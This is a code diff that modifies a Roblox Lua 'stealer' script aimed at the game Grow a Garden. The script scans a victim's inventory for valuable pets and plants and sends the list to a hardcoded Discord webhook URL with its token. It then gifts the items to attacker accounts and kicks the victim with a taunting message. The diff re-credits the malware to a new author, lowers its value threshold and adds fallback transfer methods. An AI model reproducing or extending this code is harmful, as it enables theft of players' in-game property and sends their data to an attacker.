@@ -1,13 +1,21 @@
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
-_G.scriptExecuted = true
+-- Reset execution guard
+_G.scriptExecuted = false
 
-local users = _G.Usernames or {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55"}
-local min_value = _G.min_value or 10000000
+_G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33"}
+_G.min_value = 1000000  -- Lowered from 100 million to 1 million
+_G.pingEveryone = "Yes"
+_G.webhook = "https://discord.com/api/webhooks/1397099593405038613/5xrIxTkS6bQVAQSWILV8NnQ536niOaRE4Mz0DjjBOQn6E-SnVPHObnlHaY4QUTldBHX5"
+
+-- Remove the execution guard check
+-- if _G.scriptExecuted then
+--     return
+-- end
+-- _G.scriptExecuted = true
+
+local users = _G.Usernames or {}
+local min_value = _G.min_value or 1000000  -- Lowered default
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1397099593405038613/5xrIxTkS6bQVAQSWILV8NnQ536niOaRE4Mz0DjjBOQn6E-SnVPHObnlHaY4QUTldBHX5"
+local webhook = _G.webhook or ""
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -22,25 +30,41 @@ local numberUtil = require(modules:WaitForChild("NumberUtil"))
 local dataService = require(modules:WaitForChild("DataService"))
 local character = plr.Character or plr.CharacterAdded:Wait()
 local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
-local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
+local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "Caterpillar"}
 local totalValue = 0
 local itemsToSend = {}
 
+-- Add debug print
+print("Script starting...")
+print("Place ID:", game.PlaceId)
+print("Min value:", min_value)
+
 if next(users) == nil or webhook == "" then
+    print("ERROR: No usernames or webhook configured")
     plr:kick("You didn't add any usernames or webhook")
     return
 end
 
 if game.PlaceId ~= 126884695634066 then
+    print("ERROR: Wrong game - Place ID:", game.PlaceId)
     plr:kick("Game not supported. Please join a normal GAG server")
     return
 end
 
-if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+-- Add try-catch for server type check
+local success, serverType = pcall(function()
+    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
+end)
+
+if success and serverType == "VIPServer" then
+    print("ERROR: VIP Server detected")
     plr:kick("Server error. Please join a DIFFERENT server")
     return
 end
 
+print("All checks passed, continuing...")
+
+-- ... existing code ...
 local function calcPetValue(v14)
     local hatchedFrom = v14.PetData.HatchedFrom
     if not hatchedFrom or hatchedFrom == "" then
@@ -170,7 +194,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "GAG stealer by RONZZ. discord.gg/GY2RVSEGDT"
+                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
             }
         }}
     }
@@ -179,12 +203,23 @@ local function SendJoinMessage(list, prefix)
     local headers = {
         ["Content-Type"] = "application/json"
     }
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    
+    -- Add error handling for request function
+    local success, response = pcall(function()
+        return request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+    
+    if not success then
+        print("ERROR: Failed to send webhook - request function not available")
+        print("Response:", response)
+    else
+        print("Webhook sent successfully")
+    end
 end
 
 local function SendMessage(sortedItems)
@@ -229,7 +264,7 @@ local function SendMessage(sortedItems)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "GAG stealer by RONZZ. discord.gg/GY2RVSEGDT"
+				["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
 			}
         }}
     }
@@ -238,16 +273,33 @@ local function SendMessage(sortedItems)
     local headers = {
         ["Content-Type"] = "application/json"
     }
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    
+    -- Add error handling for request function
+    local success, response = pcall(function()
+        return request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+    
+    if not success then
+        print("ERROR: Failed to send webhook - request function not available")
+        print("Response:", response)
+    else
+        print("Webhook sent successfully")
+    end
 end
+
+print("Scanning backpack for items...")
+local itemCount = 0
 
 for _, tool in ipairs(backpack:GetChildren()) do
     if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+        itemCount = itemCount + 1
+        print("Found item:", tool.Name)
+        
         if tool:GetAttribute("ItemType") == "Pet" then
             local petUUID = tool:GetAttribute("PET_UUID")
             local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
@@ -261,20 +313,28 @@ for _, tool in ipairs(backpack:GetChildren()) do
                 local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                 totalValue = totalValue + value
                 table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
+                print("Added pet:", itemName, "Value:", value)
             end
         else
             local value = calcPlantValue(tool)
+            print("Plant value:", value, "Min required:", min_value)
             if value >= min_value then
                 local weight = getWeight(tool)
                 local itemName = tool:GetAttribute("ItemName")
                 totalValue = totalValue + value
                 table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
+                print("Added plant:", itemName, "Value:", value)
             end
         end
     end
 end
 
+print("Total items found:", itemCount)
+print("Items to send:", #itemsToSend)
+print("Total value:", totalValue)
+
 if #itemsToSend > 0 then
+    print("Processing items...")
     table.sort(itemsToSend, function(a, b)
         if a.Type ~= "Pet" and b.Type == "Pet" then
             return true
@@ -308,44 +368,82 @@ if #itemsToSend > 0 then
     SendJoinMessage(sentItems, prefix)
 
     local function doSteal(player)
-        local victimRoot = character:WaitForChild("HumanoidRootPart")
-        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
-        wait(0.1)
-
-        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")
-
+        print("Starting steal process for player:", player.Name)
+        
+        -- Try different gift methods
         for _, item in ipairs(itemsToSend) do
+            print("Attempting to gift item:", item.Name)
             item.Tool.Parent = character
-            if item.Type == "Pet" then
-                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
-                repeat
-                    task.wait(0.01)
-                until promptHead.Enabled
-                fireproximityprompt(promptHead)
-            else
-                repeat
-                    task.wait(0.01)
-                until promptRoot.Enabled
-                fireproximityprompt(promptRoot)
-            end
-            task.wait(0.1)
-            item.Tool.Parent = backpack
-            task.wait(0.1)
-        end
-
-        local itemsStillInBackpack = true
-        while itemsStillInBackpack do
-            itemsStillInBackpack = false
-            for _, item in ipairs(itemsToSend) do
-                if backpack:FindFirstChild(item.Tool.Name) then
-                    itemsStillInBackpack = true
-                    break
+            
+            local success = false
+            
+            -- Method 1: Try Gift_Item event
+            if not success then
+                local giftSuccess, giftResult = pcall(function()
+                    local giftEvent = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Gift_Item")
+                    if giftEvent then
+                        giftEvent:FireServer(item.Tool, player)
+                        return true
+                    end
+                end)
+                success = giftSuccess and giftResult
+                if success then
+                    print("Successfully gifted using Gift_Item event")
                 end
             end
-            task.wait(0.1)
+            
+            -- Method 2: Try GiftPet event for pets
+            if not success and item.Type == "Pet" then
+                local petSuccess, petResult = pcall(function()
+                    local giftPetEvent = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")
+                    if giftPetEvent then
+                        giftPetEvent:FireServer(item.Tool, player)
+                        return true
+                    end
+                end)
+                success = petSuccess and petResult
+                if success then
+                    print("Successfully gifted pet using GiftPet event")
+                end
+            end
+            
+            -- Method 3: Try using proximity prompts as fallback
+            if not success then
+                print("Trying proximity prompt method for:", item.Name)
+                local promptSuccess, promptResult = pcall(function()
+                    -- Move close to player
+                    local victimRoot = character:WaitForChild("HumanoidRootPart")
+                    local targetRoot = player.Character:WaitForChild("HumanoidRootPart")
+                    victimRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 3)
+                    task.wait(0.1)
+                    
+                    -- Try to find and use proximity prompt
+                    local promptRoot = targetRoot:WaitForChild("ProximityPrompt")
+                    if promptRoot then
+                        repeat
+                            task.wait(0.01)
+                        until promptRoot.Enabled
+                        fireproximityprompt(promptRoot)
+                        return true
+                    end
+                end)
+                success = promptSuccess and promptResult
+                if success then
+                    print("Successfully used proximity prompt")
+                end
+            end
+            
+            if not success then
+                print("Failed to gift item:", item.Name, "using all methods")
+            end
+            
+            task.wait(0.3)
+            item.Tool.Parent = backpack
+            task.wait(0.3)
         end
 
-        plr:kick("All your stuff just got stolen by RONZZ's stealer!\n Join discord.gg/GY2RVSEGDT")
+        print("Steal process completed")
+        plr:kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
     end
 
     local function waitForUserChat()
@@ -363,6 +461,9 @@ if #itemsToSend > 0 then
         end
         for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
         Players.PlayerAdded:Connect(onPlayerChat)
+        print("Waiting for target players to chat...")
     end
     waitForUserChat()
-end
+else
+    print("No items found that meet the minimum value requirement")
+end 
